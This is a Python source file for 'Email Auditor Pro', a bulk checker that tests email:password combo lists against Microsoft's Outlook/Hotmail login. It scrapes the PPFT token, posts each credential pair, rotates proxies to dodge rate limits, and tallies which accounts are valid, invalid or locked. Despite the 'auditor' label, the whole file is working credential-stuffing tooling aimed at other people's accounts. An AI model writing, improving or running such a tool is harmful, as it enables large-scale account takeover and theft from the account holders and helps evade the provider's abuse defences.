"""
Email Auditor Pro — Outlook/Hotmail Account Checker (email:pass)
Uses the classic login.live.com POST flow with PPFT token extraction.
No SMTP, only HTTP/S with aiohttp.
"""
import asyncio
import re
import time
import random
from datetime import datetime
from typing import Optional, Dict, Any

import aiohttp
from aiohttp_socks import ProxyConnector
import config


class OutlookChecker:
    """
    Handles single email:pass verification against Microsoft's login endpoint.
    """

    LOGIN_URL = "https://login.live.com/login.srf"
    POST_URL = "https://login.live.com/ppsecure/post.srf"
    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    def __init__(self, timeout: int = config.SMTP_TIMEOUT):
        self.timeout = timeout

    async def _get_ppft(self, proxy_url: Optional[str] = None) -> Optional[str]:
        """
        Fetch the login page and extract the PPFT (request verification token).
        """
        connector = ProxyConnector.from_url(proxy_url) if proxy_url else None
        async with aiohttp.ClientSession(connector=connector) as session:
            try:
                params = {
                    "wa": "wsignin1.0",
                    "rpsnv": "13",
                    "ct": str(int(time.time())),
                    "rver": "7.0.0.0",
                    "wp": "MBI",
                    "wreply": "https://outlook.live.com/owa/",
                    "lc": "1033",
                    "id": "292841",
                }
                async with session.get(
                    self.LOGIN_URL,
                    params=params,
                    headers={"User-Agent": self.USER_AGENT},
                    timeout=self.timeout,
                ) as resp:
                    text = await resp.text()
                    # Extract PPFT value from hidden input
                    match = re.search(
                        r'<input[^>]*name="PPFT"[^>]*value="([^"]+)"',
                        text,
                        re.IGNORECASE,
                    )
                    if match:
                        return match.group(1)
                    # Fallback: look for sFTTag
                    match2 = re.search(
                        r'name="PPFT"[^>]*value="([^"]+)"', text, re.IGNORECASE
                    )
                    return match2.group(1) if match2 else None
            except Exception:
                return None

    async def check(
        self, email: str, password: str, proxy_url: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Check a single email:pass combination.
        Returns dict with keys: email, status, detail, checked_at.
        Statuses: Valid, Invalid, Locked/2FA, Retry, Timeout, Error.
        """
        result = {
            "email": email,
            "password": password,
            "status": "Error",
            "detail": "",
            "checked_at": datetime.utcnow().isoformat(),
        }

        # Basic format check
        if ":" in email:  # if user accidentally sent email:pass in email field
            parts = email.split(":", 1)
            email = parts[0]
            password = password or parts[1]

        if "@" not in email or not password:
            result["status"] = "Invalid"
            result["detail"] = "Malformed email or missing password"
            return result

        # Step 1: Get PPFT token
        ppft = await self._get_ppft(proxy_url)
        if not ppft:
            result["status"] = "Retry"
            result["detail"] = "Failed to get login token (proxy issue?)"
            return result

        # Step 2: Perform login POST
        connector = ProxyConnector.from_url(proxy_url) if proxy_url else None
        async with aiohttp.ClientSession(connector=connector) as session:
            try:
                data = {
                    "login": email,
                    "passwd": password,
                    "PPFT": ppft,
                }
                headers = {
                    "User-Agent": self.USER_AGENT,
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                async with session.post(
                    self.POST_URL,
                    data=data,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=False,  # We'll handle redirects manually
                ) as resp:
                    text = await resp.text()
                    final_url = str(resp.url)

                    # ─── Classification ───

                    # 1. Success: Redirect to outlook.live.com
                    if "outlook.live.com" in final_url or "login.live.com?cobrandid" in final_url:
                        result["status"] = "Valid"
                        result["detail"] = "Login successful"
                        return result

                    # 2. Locked / 2FA / Account issue
                    if (
                        "account is locked" in text.lower()
                        or "two-factor" in text.lower()
                        or "E_Blocked" in text
                        or "E_Multi" in text
                        or "verification" in text.lower()
                        and "security" in text.lower()
                    ):
                        result["status"] = "Locked/2FA"
                        result["detail"] = "Account locked or requires 2FA"
                        return result

                    # 3. Invalid password
                    if (
                        "password you entered is incorrect" in text.lower()
                        or "sign in to" in text.lower()
                        and "password" in text.lower()
                        or "E_Password" in text
                        or "wrong password" in text.lower()
                    ):
                        result["status"] = "Invalid"
                        result["detail"] = "Incorrect password"
                        return result

                    # 4. Generic fail (could be banned IP, rate limit, etc.)
                    result["status"] = "Retry"
                    result["detail"] = f"Unknown response from login page"

            except asyncio.TimeoutError:
                result["status"] = "Timeout"
                result["detail"] = f"Request timed out after {self.timeout}s"
            except Exception as exc:
                result["status"] = "Retry"
                result["detail"] = str(exc)

        return result


class BulkChecker:
    """
    Orchestrates bulk email:pass checking with dynamic concurrency,
    proxy rotation, and live progress reporting.
    """

    def __init__(
        self,
        proxy_manager,
        concurrency: int = config.MAX_CONCURRENT_CHECKS,
        progress_callback=None,
    ):
        self.proxy_manager = proxy_manager
        self.concurrency = concurrency
        self.progress_callback = progress_callback
        self.checker = OutlookChecker()
        self._cancelled = False

    def cancel(self):
        self._cancelled = True

    async def run(self, combos: list) -> list:
        """
        Run bulk checking using an asyncio.Queue.
        Input: list of (email, password) tuples.
        Returns list of result dicts.
        """
        total = len(combos)
        processed = 0
        valid = invalid = locked = retry = timeout = 0
        results = []
        start_time = asyncio.get_event_loop().time()

        queue = asyncio.Queue(maxsize=self.concurrency * 2)
        sem = asyncio.Semaphore(self.concurrency)
        lock = asyncio.Lock()

        async def _producer():
            for email, password in combos:
                if self._cancelled:
                    break
                await queue.put((email, password))
            await queue.put(None)  # sentinel

        async def _worker():
            nonlocal processed, valid, invalid, locked, retry, timeout
            while True:
                item = await queue.get()
                if item is None:
                    await queue.put(None)
                    break
                if self._cancelled:
                    queue.task_done()
                    continue
                email, password = item

                async with sem:
                    proxy = await self.proxy_manager.get_proxy()
                    try:
                        res = await self.checker.check(email, password, proxy)
                    finally:
                        if proxy:
                            await self.proxy_manager.return_proxy(proxy)

                async with lock:
                    results.append(res)
                    processed += 1
                    status = res["status"]
                    if status == "Valid":
                        valid += 1
                    elif status == "Invalid":
                        invalid += 1
                    elif status == "Locked/2FA":
                        locked += 1
                    elif status == "Retry":
                        retry += 1
                    elif status == "Timeout":
                        timeout += 1

                    if self.progress_callback and (
                        processed % max(1, total // 20) == 0 or processed == total
                    ):
                        elapsed = asyncio.get_event_loop().time() - start_time
                        speed = (processed / elapsed) * 60 if elapsed > 0 else 0
                        await self.progress_callback(
                            total=total,
                            processed=processed,
                            valid=valid,
                            invalid=invalid,
                            locked=locked,
                            retry=retry,
                            timeout=timeout,
                            elapsed=elapsed,
                            speed=speed,
                            final=(processed == total),
                        )
                queue.task_done()

        workers = [asyncio.create_task(_worker()) for _ in range(self.concurrency)]
        await _producer()
        await asyncio.gather(*workers)

        if self.progress_callback:
            elapsed = asyncio.get_event_loop().time() - start_time
            speed = (processed / elapsed) * 60 if elapsed > 0 else 0
            await self.progress_callback(
                total=total,
                processed=processed,
                valid=valid,
                invalid=invalid,
                locked=locked,
                retry=retry,
                timeout=timeout,
                elapsed=elapsed,
                speed=speed,
                final=True,
            )

        return results
